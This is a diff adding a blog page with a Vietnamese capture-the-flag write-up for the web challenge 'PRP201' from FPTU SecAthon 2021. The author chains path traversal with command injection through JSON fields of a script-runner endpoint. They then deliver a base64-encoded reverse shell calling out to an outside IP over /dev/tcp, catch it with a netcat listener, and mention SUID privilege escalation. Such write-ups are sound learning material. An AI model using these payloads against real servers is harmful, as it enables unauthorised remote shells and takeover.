@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>phucdc's Blog</title>
+<link
+    rel="stylesheet"
+    href="/assets/css/styles.css"
+/>
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">
+<link rel="mask-icon" href="/assets/favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+<link
+  rel="stylesheet"
+  href="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+
+<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-2 bg-dark vh-100 sticky-top sidebar text-center">
+    <div class="avatar">
+        <img id="avatar" src="/assets/avatar.png" class="rounded-circle" alt="">
+    </div> <br>
+    <h3 class="text-white text-center">phucdc's Blog</h3>
+    <hr class="text-white">
+    <div class="nav">
+        <ul>
+            
+           <li class="nav-item">
+                <a href="/"><i class="bi bi-house"></i>Home</a>
+           </li> 
+           
+           <li class="nav-item">
+                <a href="/about/"><i class="bi bi-info-square"></i>About</a>
+           </li> 
+           
+        </ul>
+    </div>
+    <div class="nav contact">
+        <ul>
+            
+            <li class="nav-item">
+                <a href="https://github.com/phucdc-noob">
+                    <i class="bi bi-github"></i>
+                </a>
+            </li>
+            
+            <li class="nav-item">
+                <a href="https://twitter.com/PhucdcN">
+                    <i class="bi bi-twitter"></i>
+                </a>
+            </li>
+            
+            <li class="nav-item">
+                <a href="https://www.facebook.com/phuc.duongcong5545/">
+                    <i class="bi bi-facebook"></i>
+                </a>
+            </li>
+            
+            <li class="nav-item">
+                <a href="mailto:phucbontu1012@gmail.com">
+                    <i class="bi bi-envelope"></i>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+    
+
+            <div class="main col-md-8" id="main">
+                <div class="post" id="post">
+    <h1>FPTU SecAthon 2021 | Web Writeup | PRP201</h1>
+    <span>Oct 10, 21</span>
+    <hr>
+    <div id="post-content"><h1 id="prp201">PRP201</h1>
+
+<blockquote>
+  <p>Đây là challenge mà mình đã đoán được một phần, nhưng vẫn mất gần 1 ngày để giải ra :&lt; Một sản phẩm đến từ anh Khoa (matuhn)</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Truy cập vào bài thì thấy có 5 đường dẫn đến 5 file txt</p>
+  </li>
+  <li>
+    <p>Thử truy cập vào một trong số đó sẽ thấy URL có dạng: <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/getData?f=/fus/data/1.txt</code>, liệu đây có phải path traversal? có vẻ như các anh ra đề năm nay khá thích path traversal</p>
+  </li>
+  <li>
+    <p>Mò mẫm một lúc thì mình tìm được file <code class="language-plaintext highlighter-rouge">flag.txt</code> cũng trong <code class="language-plaintext highlighter-rouge">/fus/data</code> :D với nội dung như sau:</p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_1.png" alt="flag.txt" /></p>
+  </li>
+  <li>
+    <p>Vậy là cần phải làm cách nào đó để xem được cái <code class="language-plaintext highlighter-rouge">secret_service</code> đó</p>
+  </li>
+  <li>
+    <p>Đến đây thì mình bắt đầu bí rồi, path traversal thì cũng cần phải biết có những gì trong đó chứ (hoặc ít nhất là mình nghĩ vậy), cho tới khi ban ra đề cho hint đầu tiên: <code class="language-plaintext highlighter-rouge">?f=/fus/data/../app.py</code>, vậy hãy xem source code này có vấn đề gì?</p>
+  </li>
+  <li>
+    <p>Vì source khá dài nên mình sẽ phân tích từng hàm một, bỏ qua hàm index, vì nó in ra trang mà chúng ta truy cập vào đầu tiên</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/getData'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
+  <span class="k">def</span> <span class="nf">getLog</span><span class="p">():</span>
+      <span class="n">log_file</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'f'</span><span class="p">)</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">log_file</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'/fus/data'</span><span class="p">)):</span>
+          <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">send_file</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s">'text/plain'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+      <span class="k">else</span><span class="p">:</span>
+          <span class="k">return</span> <span class="p">({</span><span class="s">'status'</span><span class="p">:</span> <span class="s">'invalid path'</span><span class="p">},</span><span class="mi">200</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Ok, đây chính là hàm mà chúng ta dùng để đọc file và thực hiện path traversal, không có nhiều điều để nói về nó.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1"># run script to crawl data
+</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/runScript'</span><span class="p">)</span>
+  <span class="k">def</span> <span class="nf">runScript</span><span class="p">():</span>
+      <span class="n">json</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">json</span>
+      <span class="n">msg</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">json</span><span class="p">)</span>
+      <span class="k">return</span> <span class="p">({</span><span class="s">'status'</span><span class="p">:</span> <span class="n">msg</span><span class="p">},</span><span class="mi">200</span><span class="p">)</span>
+
+  <span class="k">def</span> <span class="nf">check_script_dup</span><span class="p">(</span><span class="n">scripts</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">):</span>
+      <span class="k">try</span><span class="p">:</span>
+          <span class="n">script_parent_dir</span> <span class="o">=</span> <span class="n">scripts</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'dir'</span><span class="p">]</span>
+          <span class="n">script_path</span> <span class="o">=</span> <span class="n">script_parent_dir</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span>
+      <span class="k">except</span><span class="p">:</span>
+          <span class="k">return</span> <span class="s">"missing dir and name"</span>
+      <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">script_path</span><span class="p">):</span>
+          <span class="k">return</span> <span class="s">"duplicate script"</span>
+      <span class="k">else</span><span class="p">:</span>
+          <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">script_parent_dir</span><span class="p">):</span>
+              <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">script_parent_dir</span><span class="p">)</span>
+          <span class="k">return</span> <span class="n">download_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">)</span>
+
+  <span class="k">def</span> <span class="nf">download_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">):</span>
+      <span class="k">try</span><span class="p">:</span>
+          <span class="n">script_link</span> <span class="o">=</span> <span class="n">json</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
+      <span class="k">except</span><span class="p">:</span>
+          <span class="k">return</span> <span class="s">"missing url"</span>
+      <span class="c1"># don't trust anyone
+</span>      <span class="k">if</span> <span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">script_link</span><span class="p">).</span><span class="n">netloc</span> <span class="o">==</span> <span class="s">"localhost:8888"</span><span class="p">):</span>
+          <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">script_link</span><span class="p">)</span>
+          <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+              <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+              <span class="n">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">)</span>
+      <span class="k">else</span><span class="p">:</span>
+          <span class="k">return</span> <span class="s">"invalid script link"</span>
+
+  <span class="k">def</span> <span class="nf">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">):</span>
+      <span class="n">lf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">command_log</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span>
+      <span class="n">command</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">'bash'</span><span class="p">,</span> <span class="n">script_path</span><span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+      <span class="k">return</span> <span class="s">"Run successfully"</span>
+
+  <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">json</span><span class="p">):</span>
+      <span class="n">scripts</span> <span class="o">=</span> <span class="n">home</span> <span class="o">+</span> <span class="s">'/scripts'</span>
+      <span class="n">log</span> <span class="o">=</span> <span class="n">home</span> <span class="o">+</span> <span class="s">'/logs'</span>
+      <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">scripts</span><span class="p">):</span>
+          <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">scripts</span><span class="p">)</span>
+      <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">log</span><span class="p">):</span>
+          <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
+      <span class="k">try</span><span class="p">:</span>
+          <span class="n">command_log</span> <span class="o">=</span> <span class="n">log</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'command_log'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.txt'</span>
+      <span class="k">except</span><span class="p">:</span>
+          <span class="k">return</span> <span class="s">"missing command_log"</span>
+      <span class="n">msg</span> <span class="o">=</span> <span class="n">check_script_dup</span><span class="p">(</span><span class="n">scripts</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">msg</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Mình sẽ để cả 5 hàm này chung với nhau, vì chúng liên quan mật thiết với nhau, và cũng là tiền đề cho mọi thứ</p>
+  </li>
+  <li>
+    <p>Ta có thứ tự như sau:</p>
+
+    <ul>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">runScript()</code> nhận json từ request và truyền cho hàm <code class="language-plaintext highlighter-rouge">start()</code></p>
+
+        <ul>
+          <li>
+            <p><code class="language-plaintext highlighter-rouge">start()</code> xử lý việc tạo ra đường dẫn thư mục cho <code class="language-plaintext highlighter-rouge">logs</code>, <code class="language-plaintext highlighter-rouge">scripts</code> và tạo file <code class="language-plaintext highlighter-rouge">command_log</code> và đưa vào hàm <code class="language-plaintext highlighter-rouge">check_script_dup()</code></p>
+          </li>
+          <li>
+            <p><code class="language-plaintext highlighter-rouge">check_script_dup()</code> nôm na thì kiểm tra xem file script đã tồn tại hay không, nếu tồn tại thì tất nhiên là không cần mất công đến hàm tiếp theo, hàm <code class="language-plaintext highlighter-rouge">download_script()</code></p>
+          </li>
+          <li>
+            <p><code class="language-plaintext highlighter-rouge">download_script()</code> là phần sẽ “tạo ra nội dung file”, bằng cách nhập file từ <code class="language-plaintext highlighter-rouge">url</code> trong JSON vào file <code class="language-plaintext highlighter-rouge">script</code>, ở đây ta biết được rằng, <code class="language-plaintext highlighter-rouge">url</code> đó sẽ có dạng <code class="language-plaintext highlighter-rouge">http://localhost:8888/anything_else</code> vì đoạn <code class="language-plaintext highlighter-rouge">#dont trust anyone</code>, hãy nhớ điều này</p>
+          </li>
+          <li>
+            <p>Sau khi <code class="language-plaintext highlighter-rouge">download_script()</code> hoàn tất, hàm <code class="language-plaintext highlighter-rouge">run_script()</code> được khởi động, hàm này sẽ chạy một câu lệnh <code class="language-plaintext highlighter-rouge">bash &lt;script_bash&gt;</code>, và từ đây ta hiểu được 2 điều:</p>
+
+            <ul>
+              <li>
+                <p><code class="language-plaintext highlighter-rouge">script_bash</code> là tên file được thực thi bới lệnh <code class="language-plaintext highlighter-rouge">bash</code>, có nội dung được nhập từ nôi dung file trên <code class="language-plaintext highlighter-rouge">url</code> của JSON truyền vào</p>
+              </li>
+              <li>
+                <p><code class="language-plaintext highlighter-rouge">command_log</code> chính là file log của <code class="language-plaintext highlighter-rouge">stdout</code> và <code class="language-plaintext highlighter-rouge">stderr</code>, như vậy khi thực thi, output và thông báo lỗi của <code class="language-plaintext highlighter-rouge">bash</code> đều sẽ đẩy vào file log đó, và tất nhiên, ta có thể xem file log đó qua path traversal</p>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Đến đây thì mình (và tin chắc ai đó khi xem WU này), chắc hẳn đều đã nghĩ ra rồi, tác giả cũng đã ra hint <code class="language-plaintext highlighter-rouge">suprocess.Popen(), stderr, stdout là gì?</code> rồi :v</p>
+  </li>
+  <li>
+    <p>Mình thử luôn nhé :v Như ở trên ta đã có JSON bao gồm <code class="language-plaintext highlighter-rouge">dir</code>, <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">command_log</code>, <code class="language-plaintext highlighter-rouge">url</code></p>
+  </li>
+  <li>
+    <p>URL để nhận file JSON là <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/runScript</code>, để gửi JSON lên thì mình sử dụng <code class="language-plaintext highlighter-rouge">curl</code> như sau:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{json}'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Mình sẽ thử tạo một JSON như sau:</p>
+
+    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"ls"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"log"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Ghép lại với <code class="language-plaintext highlighter-rouge">curl</code>:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "test", "name" : "ls", "command_log" : "log", "url" : "http://localhost:8888/"}'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Và sau khi gửi, truy cập vào <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/getData?f=/fus/data/../logs/log.txt</code> để xem kết quả của câu lệnh là gì (ta biết <code class="language-plaintext highlighter-rouge">logs</code> cùng chung thư mục cha với <code class="language-plaintext highlighter-rouge">data</code> khi xem code):</p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_2.png" alt="curl" /></p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_3.png" alt="log.txt" /></p>
+  </li>
+  <li>
+    <p>Có thể thấy rằng, nội dung file chính<code class="language-plaintext highlighter-rouge">log.txt</code> chính là biến <code class="language-plaintext highlighter-rouge">script_path</code> được ra thêm cả <code class="language-plaintext highlighter-rouge">response</code> của <code class="language-plaintext highlighter-rouge">index()</code>, chúng trên một dòng nên sẽ bị lỗi, thử đổi <code class="language-plaintext highlighter-rouge">ls</code> thành <code class="language-plaintext highlighter-rouge">\nls\n</code> ở JSON và gửi lên, sẽ thấy sự khác biệt:</p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_4.png" alt="curl_1" /></p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_5.png" alt="log.txt_1" /></p>
+  </li>
+  <li>
+    <p>Thấy rõ là <code class="language-plaintext highlighter-rouge">ls</code> đã thụt xuống, vậy điều này có ý nghĩa gì? <code class="language-plaintext highlighter-rouge">bash &lt;filename&gt;</code> khi chạy sẽ chạy từ trên xuống như các ngôn ngữ lập trình, nhưng có một điều đặc biệt là, hàng nào lỗi, nó sẽ in ra lỗi và chạy hàng tiếp theo, chứ không dừng lại khi gặp lỗi syntax bên trong</p>
+  </li>
+  <li>
+    <p>Đến đây thì mình đã nhận ra, hàm <code class="language-plaintext highlighter-rouge">download_script()</code>, vậy sẽ ra sao nếu mình truyền vào <code class="language-plaintext highlighter-rouge">url</code> trong JSON là <code class="language-plaintext highlighter-rouge">http://localhost:8888/getData?f=/fus/data/../logs/log.txt</code> (nên lưu ý <code class="language-plaintext highlighter-rouge">localhost</code> ở đây là local của server :&gt; ), thì có phải <code class="language-plaintext highlighter-rouge">download_script()</code> sẽ lấy nội dung của <code class="language-plaintext highlighter-rouge">log.txt</code> để đưa vào <code class="language-plaintext highlighter-rouge">script_path</code>?</p>
+  </li>
+  <li>
+    <p>Như vậy mình tạo JSON mới và lệnh <code class="language-plaintext highlighter-rouge">curl</code> mới như sau:</p>
+
+    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"ls.sh"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"lssh"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/getData?f=/fus/data/../logs/log.txt"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "test", "name" : "ls.sh", "command_log" : "lssh", "url" : "http://localhost:8888/getData?f=/fus/data/../logs/log.txt"}'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Và gửi đi, giờ chỉ cần mở file <code class="language-plaintext highlighter-rouge">lssh.txt</code> bằng path traversal và thu được kết quả:</p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_6.png" alt="curl_2" /></p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_7.png" alt="lssh.txt" /></p>
+  </li>
+  <li>
+    <p>Vậy là chính xác rồi, nhưng có một vấn đề là ta cần tìm đến <code class="language-plaintext highlighter-rouge">/root</code> để mở file <code class="language-plaintext highlighter-rouge">secret_service</code>, và tất nhiên là phải root thì mới có thể làm được điều đó (mình đã thử rồi)</p>
+  </li>
+  <li>
+    <p>Mụ mẫm cả đầu thì anh T giấu tên và anh Khoa (tác giả) đã gợi ý về <code class="language-plaintext highlighter-rouge">reverse shell</code></p>
+  </li>
+  <li>
+    <p>Vậy bây giờ chỉ cần dùng cách trên, tạo một file chạy một đoạn reverse shell và chúng ta sẽ chiếm quyền thông qua SUID (hint từ tác giả) là xong</p>
+  </li>
+  <li>
+    <p>Nhưng, mình đã thử và nhận ra, tất cả những command mà chứa dấu ‘/’ thì lỗi 500 là rõ, như ở dưới mình để <code class="language-plaintext highlighter-rouge">name</code> trong JSON là <code class="language-plaintext highlighter-rouge">\nls ../root\n</code>:</p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_8.png" alt="500" /></p>
+  </li>
+  <li>
+    <p>Vậy là mình cần cách khác, nhưng trước tiên, phải chuẩn bị cái reverse shell đã :D</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/34.92.153.161/8899 0&gt;&amp;1
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Có cả revshell của <code class="language-plaintext highlighter-rouge">bash</code>, <code class="language-plaintext highlighter-rouge">nc</code>, …, tìm hiểu tại <a href="https://www.revshells.com/">đây</a></p>
+  </li>
+  <li>
+    <p>Vẫn là tác giả đã gợi ý cho mình một cách để đẩy được revshell kia lên, sử dụng <code class="language-plaintext highlighter-rouge">base64</code>, chuyển đoạn shell ở trên thành <code class="language-plaintext highlighter-rouge">base64</code> encode, và đưa về dạng sau:</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">echo</span> <span class="s2">"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjEK"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Vậy là xong, giờ cần chuẩn bị request đầu tiên (hãy nhớ escape string :v):</p>
+
+    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"</span><span class="se">\n</span><span class="s2">echo </span><span class="se">\"</span><span class="s2">c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=</span><span class="se">\"</span><span class="s2"> | base64 -d | bash</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "rev","name" : "\necho \"c2ggLWkgPiYgL2Rldi90Y3AvMzQuOTIuMTUzLjE2MS84ODk5IDA+JjE=\" | base64 -d | bash\n","command_log" : "rev","url" : "http://localhost:8888/"}'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Gửi đi, và trước khi đến với lần request thứ 2, mình phải tạo một listener trên máy của mình đã (thực ra là VPS mình mượn của một người bạn xứ cảng):</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nc <span class="nt">-lvnp</span> 8899
+</code></pre></div>    </div>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_9.png" alt="listener" /></p>
+  </li>
+  <li>
+    <p>Giờ để listener ở đó, ta quay lại với request thứ 2, request để chạy revshell:</p>
+
+    <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev_tcp"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev_tcp.sh"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"rev"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span></code></pre></div>    </div>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "rev_tcp","name" : "rev_tcp.sh","command_log" : "rev","url" : "http://localhost:8888/getData?f=/fus/data/../logs/rev.txt"}'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Và gửi đi, rồi quay lại listener:</p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_10.png" alt="revshell" /></p>
+  </li>
+  <li>
+    <p>Vậy là ta đã mở được reverse shell trên server</p>
+  </li>
+  <li>
+    <p>Bây giờ chỉ cần tiến hành <a href="https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd">leo thang đặc quyền</a> thôi:</p>
+
+    <p><img src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_11.png" alt="done" /></p>
+  </li>
+  <li>
+    <p>Ta có flag: <code class="language-plaintext highlighter-rouge">"FUSec{a9595511e650bb0ff367d8144818802b}"</code></p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>Cảm ơn anh Khoa và anh T giấu tên (không lừa) đã luôn hỗ trợ, đấm mồm thằng em để em có thể giải được bài này</p>
+</blockquote>
+
+<blockquote>
